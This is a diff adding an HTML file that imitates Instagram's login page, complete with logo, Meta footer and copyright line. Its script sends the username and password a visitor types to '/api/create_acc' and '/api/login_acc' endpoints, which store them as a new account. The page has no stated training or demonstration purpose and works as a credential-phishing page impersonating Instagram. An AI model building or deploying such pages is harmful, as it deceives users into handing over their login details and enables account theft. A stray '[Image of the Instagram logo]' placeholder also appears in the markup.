@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        :root {
+            /* Dark Mode Color Palette (Unified) */
+            --dark-bg: #0d1015;        /* Genel Arka Plan */ 
+            --card-bg: #0d1015;        /* KART ARKA PLANI AYNI (Bütünleşik Görünüm) */
+            --text-color: #f5f5f5; 
+            --input-bg: #262626;       
+            --input-border: #363636;   
+            --insta-blue: #0095f6;
+            --link-color: #0095f6;
+            --secondary-text: #a8a8a8;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            color: var(--text-color);
+            background-color: var(--dark-bg);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* --- Main Container and PC Layout --- */
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 80px 20px 40px; 
+            width: 100%;
+            max-width: 935px;
+            flex-grow: 1;
+        }
+
+        /* --- Left Panel (Visual Flow) --- */
+        .left-panel {
+            width: 50%;
+            max-width: 440px; 
+            margin-right: 32px;
+            display: flex;
+            justify-content: flex-end;
+            align-self: flex-start;
+        }
+        
+        .left-panel-img {
+            width: 440px; 
+            height: 500px;
+            object-fit: contain;
+        }
+
+        /* --- Right Panel: Login Form --- */
+        .right-panel {
+            width: 50%;
+            max-width: 350px; 
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* --- 1. Login Card --- */
+        .login-card {
+            background-color: var(--card-bg); /* KART ARKA PLANI GÜNCELLENDİ */
+            border: none; /* Kenarlık kaldırıldı */
+            border-radius: 1px;
+            padding: 40px 0 20px; /* Kenarlık olmadığı için padding ayarlandı */
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        
+        /* --- LOGO IMAGE STYLE --- */
+        .instagram-logo-img {
+            width: 175px; 
+            height: 51px; 
+            margin-bottom: 30px;
+        }
+
+        /* --- Input Fields --- */
+        .input-group { margin-bottom: 6px; }
+        .input-group input {
+            width: 100%; padding: 10px 8px; border: 1px solid var(--input-border);
+            border-radius: 3px; box-sizing: border-box; background-color: var(--input-bg);
+            font-size: 12px; color: var(--text-color);
+        }
+        .input-group input::placeholder { color: var(--secondary-text); }
+        .input-group input:focus { border-color: #a8a8a8; outline: none; background-color: #1c1c1c; }
+        
+        /* --- Buttons --- */
+        .btn {
+            width: 100%; padding: 8px 16px; margin-top: 8px; border: none;
+            border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 14px;
+            background-color: var(--insta-blue); color: #fff; opacity: 1; 
+        }
+
+        .btn-inactive { opacity: 0.7; }
+        
+        /* --- OR Divider --- */
+        .divider {
+            display: flex; align-items: center; text-align: center; margin: 20px 0;
+            color: var(--secondary-text); font-size: 13px; font-weight: 600; text-transform: uppercase;
+        }
+        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid var(--input-border); }
+        .divider:not(:empty)::before { margin-right: .5em; }
+        .divider:not(:empty)::after { margin-left: .5em; }
+
+        /* --- Alternative Login / Links --- */
+        .fb-login {
+            color: var(--insta-blue); 
+            font-weight: 600; font-size: 14px; text-decoration: none; margin-top: 5px; display: block;
+        }
+        .fb-login i { margin-right: 5px; }
+
+        .forgot-password {
+            font-size: 12px; margin-top: 15px; color: var(--secondary-text); text-decoration: none; display: block;
+        }
+
+        /* --- 2. Sign Up Box --- */
+        .signup-box {
+            background-color: var(--card-bg); /* KART ARKA PLANI GÜNCELLENDİ */
+            border: none; /* Kenarlık kaldırıldı */
+            border-radius: 1px;
+            padding: 20px 0;
+            text-align: center;
+            font-size: 14px;
+            color: var(--text-color);
+        }
+
+        .signup-box a {
+            color: var(--link-color);
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        /* --- Footer (Bottom Links) --- */
+        .insta-footer {
+            width: 100%;
+            padding: 40px 0;
+            font-size: 12px;
+            color: var(--secondary-text);
+            text-align: center;
+            background-color: var(--dark-bg);
+        }
+        .insta-footer-links a {
+            color: var(--secondary-text);
+            text-decoration: none;
+            margin: 0 8px;
+            line-height: 2.0;
+        }
+
+        /* --- Mobile Improvements --- */
+        @media (max-width: 900px) {
+            .main-container {
+                flex-direction: column;
+                padding-top: 20px;
+            }
+            .left-panel {
+                display: none; 
+            }
+            .right-panel {
+                width: 100%;
+                max-width: 350px;
+            }
+            .insta-footer {
+                padding: 20px 10px;
+            }
+        }
+        
+        .alert {
+            padding: 10px; margin-bottom: 15px; border-radius: 3px; font-size: 14px; font-weight: 500;
+            display: none; text-align: center; background-color: #ffebe8; color: #b94a48; border: 1px solid #ebccd1;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+
+        <div class="left-panel">
+            <img src="https://gcdnb.pbrd.co/images/VhlrbtHLgUr3.png?o=1" alt="Instagram Visuals" class="left-panel-img">
+            
+        </div>
+
+        <div class="right-panel">
+            
+            <div class="login-card">
+                <img src="https://gcdnb.pbrd.co/images/kFzWRqr0iMbR.png?o=1" alt="Instagram Logo" class="instagram-logo-img">
+                
+
+[Image of the Instagram logo]
+
+
+                <div id="alertMessage" class="alert"></div>
+
+                <form id="loginForm" onsubmit="event.preventDefault(); handleSignIn();">
+                    
+                    <div class="input-group">
+                        <input type="text" id="username_email" name="username_email" placeholder="Phone number, username, or email" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <input type="password" id="password" name="password" placeholder="Password" required minlength="8">
+                    </div>
+                    
+                    <button type="submit" id="signInButton" class="btn btn-inactive" disabled>Log In</button>
+                    
+                    <div class="divider">OR</div>
+                    
+                    <a href="/sign_up/facebook" class="fb-login">
+                        <i class="fab fa-facebook-square"></i> Log in with Facebook
+                    </a>
+                    
+                    <a href="#" class="forgot-password">Forgot password?</a>
+                </form>
+            </div>
+
+            <div class="signup-box">
+                Don't have an account? <a href="/sign_up">Sign up</a>
+            </div>
+
+        </div>
+    </div>
+
+    <div class="insta-footer">
+        <div class="insta-footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <p style="margin-top: 20px; font-size: 13px;">English · © 2025 Instagram from Meta</p>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const userInput = document.getElementById('username_email');
+            const passwordInput = document.getElementById('password');
+            const signInButton = document.getElementById('signInButton');
+
+            function checkFormValidity() {
+                const isFormFilled = userInput.value.trim().length > 0 && passwordInput.value.length >= 8;
+                if (isFormFilled) {
+                    signInButton.classList.remove('btn-inactive');
+                    signInButton.disabled = false;
+                } else {
+                    signInButton.classList.add('btn-inactive');
+                    signInButton.disabled = true;
+                }
+            }
+
+            userInput.addEventListener('input', checkFormValidity);
+            passwordInput.addEventListener('input', checkFormValidity);
+            
+            checkFormValidity();
+        });
+
+        async function handleSignIn() {
+            // API Simulation for Log In / Sign Up
+            const userInput = document.getElementById('username_email').value.trim();
+            const passwordInput = document.getElementById('password').value;
+            const signInButton = document.getElementById('signInButton');
+
+            showAlert("Processing...", "neutral");
+            signInButton.disabled = true;
+            signInButton.textContent = 'Logging In...';
+            
+            const username = userInput.includes('@') ? userInput : userInput;
+            const email = userInput.includes('@') ? userInput : `${userInput}@example.com`; 
+
+            const createData = { username: username, password: passwordInput, email: email, bdate: 1.0, phone: "00000000000" };
+
+            try {
+                // 1. Attempt Account Creation (simulates registration or update)
+                await fetch('/api/create_acc', {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(createData)
+                });
+
+                // 2. Attempt Login
+                const loginData = { username: username, password: passwordInput };
+
+                const loginResponse = await fetch('/api/login_acc', {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(loginData)
+                });
+
+                if (loginResponse.ok) {
+                    showAlert("Successfully logged in. Redirecting...", "success");
+                    signInButton.textContent = 'Success!';
+                    setTimeout(() => { window.location.href = '/'; }, 1000);
+                } else {
+                    const errorText = await loginResponse.text();
+                    showAlert(`Login Failed: ${errorText}. Please check your credentials.`);
+                    document.getElementById('password').value = '';
+                }
+            } catch (error) {
+                console.error('Network Error:', error);
+                showAlert('A network error occurred. Please try again.');
+            } finally {
+                if (signInButton.textContent !== 'Success!') {
+                    signInButton.disabled = false;
+                    signInButton.textContent = 'Log In';
+                }
+            }
+        }
+
+        function showAlert(message, type = "error") {
+            const alertMessage = document.getElementById('alertMessage');
+            alertMessage.textContent = message;
+            
+            if (type === "error") {
+                alertMessage.style.backgroundColor = '#ffebe8';
+                alertMessage.style.color = '#b94a48';
+                alertMessage.style.borderColor = '#ebccd1';
+            } else if (type === "success") {
+                alertMessage.style.backgroundColor = '#dff0d8';
+                alertMessage.style.color = '#3c763d';
+                alertMessage.style.borderColor = '#d6e9c6';
+            } else {
+                alertMessage.style.backgroundColor = '#d9edf7';
+                alertMessage.style.color = '#31708f';
+                alertMessage.style.borderColor = '#bce8f1';
+            }
+
+            alertMessage.style.display = 'block';
+        }
+    </script>
+</body>
+</html>
